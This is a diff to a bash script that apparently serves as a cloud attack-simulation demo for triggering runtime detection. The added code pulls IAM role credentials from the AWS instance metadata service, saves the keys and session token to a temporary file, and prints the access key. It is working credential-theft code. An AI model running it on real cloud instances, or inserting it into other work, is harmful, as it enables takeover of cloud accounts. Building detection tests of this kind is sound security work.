@@ -1,8 +1,21 @@
 #!/bin/bash
 
+# ============================================================================
+# Cloud Access demo - Step 1 of 2: AWS credential theft via IMDS
+# ============================================================================
+#
+# What this step does:
+#   1. Hits the Instance Metadata Service (IMDS) with raw curl calls.
+#   2. Retrieves the node's IAM role credentials from IMDS (v2, then v1).
+#   3. Prints the stolen credentials and writes them in a temporary file so the
+#      follow-up scripts can read them back.
+
 # Define the IMDS endpoint IP
 IMDS_IP="169.254.169.254"
 IMDS_BASE_URL="http://${IMDS_IP}/latest/meta-data/iam/security-credentials/"
+
+
+CREDS_FILE="${CLOUD_ACCESS_CREDS_FILE:-/tmp/.aws-cloud-access-creds}"
 
 # Perform raw IMDS credential requests to generate detection signals.
 # These direct curl calls hit the IMDS endpoint and are visible to runtime
@@ -74,7 +87,7 @@ get_imds_credentials() {
     return 1
 }
 
-# Try to get credentials from IMDS first
+# Try to get credentials from IMDS.
 if ! get_imds_credentials; then
     # Fall back to command-line arguments
     if [ $# -eq 3 ]; then
@@ -91,49 +104,17 @@ else
     echo "Using credentials from IMDS (Role: ${AWS_IMDS_ROLE_NAME:-unknown})"
 fi
 
-INSTANCE_TYPE='m5.xlarge'
-REGIONS=('us-east-1' 'us-west-2' 'us-east-2' 'us-west-1' 'eu-west-1' 'eu-central-1' 'ap-southeast-1' 'ap-northeast-1')
-IMAGE_ID='ami-00000000000000000' # Likely not existing
+# Write the stolen credentials to a file so step 2 can read them back.
+cat > "$CREDS_FILE" <<EOF
+AWS_ACCESS_KEY_ID='${AWS_ACCESS_KEY_ID}'
+AWS_SECRET_ACCESS_KEY='${AWS_SECRET_ACCESS_KEY}'
+AWS_SESSION_TOKEN='${AWS_SESSION_TOKEN}'
+AWS_IMDS_ROLE_NAME='${AWS_IMDS_ROLE_NAME}'
+EOF
+chmod 600 "$CREDS_FILE"
 
-echo "Attempting to launch EC2 instances with $INSTANCE_TYPE instance type..."
+# Output the stolen credentials.
 echo ""
-
-# Check for AWS CLI
-if ! command -v aws &> /dev/null
-then
-    echo "AWS CLI is not installed. Please install it to proceed."
-    exit 1
-fi
-
-# Loop through the defined regions
-for REGION in "${REGIONS[@]}"; do
-    echo "Attempting to launch $INSTANCE_TYPE in $REGION..."
-
-    # The command to launch the instance. We use 'run-instances'.
-    # We deliberately use an invalid AMI_ID to force a failure (and a CloudTrail log entry).
-    LAUNCH_OUTPUT=$(aws ec2 run-instances \
-        --image-id "$IMAGE_ID" \
-        --instance-type "$INSTANCE_TYPE" \
-        --count 1 \
-        --region "$REGION" 2>&1)
-
-    # Check the exit status of the previous command
-    if [ $? -eq 0 ]; then
-        # If the command succeeds, parse the instance ID (less likely due to invalid AMI)
-        INSTANCE_ID=$(echo "$LAUNCH_OUTPUT" | grep '"InstanceId":' | awk '{print $2}' | tr -d '",')
-        echo "Successfully launched $INSTANCE_TYPE in $REGION. Instance ID: $INSTANCE_ID"
-    else
-        # If the command fails (which is the goal for logging attempts)
-        # We look for the 'ClientError' line to extract the error code
-        ERROR_CODE=$(echo "$LAUNCH_OUTPUT" | grep -oP '(?<=\<Code\>).*?(?=\</Code\>)' | head -1)
-
-        if [ -n "$ERROR_CODE" ]; then
-            echo "EC2 launch failed for $INSTANCE_TYPE in $REGION: $ERROR_CODE"
-        else
-            # A more generic failure occurred (e.g., region not available, CLI error)
-            echo "Error launching $INSTANCE_TYPE in $REGION. Check output for details."
-            # Uncomment the next line to see the full error output:
-            # echo "$LAUNCH_OUTPUT"
-        fi
-    fi
-done
+echo "=== Stolen AWS access key (saved in ${CREDS_FILE}) ==="
+echo "AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID}"
+echo ""
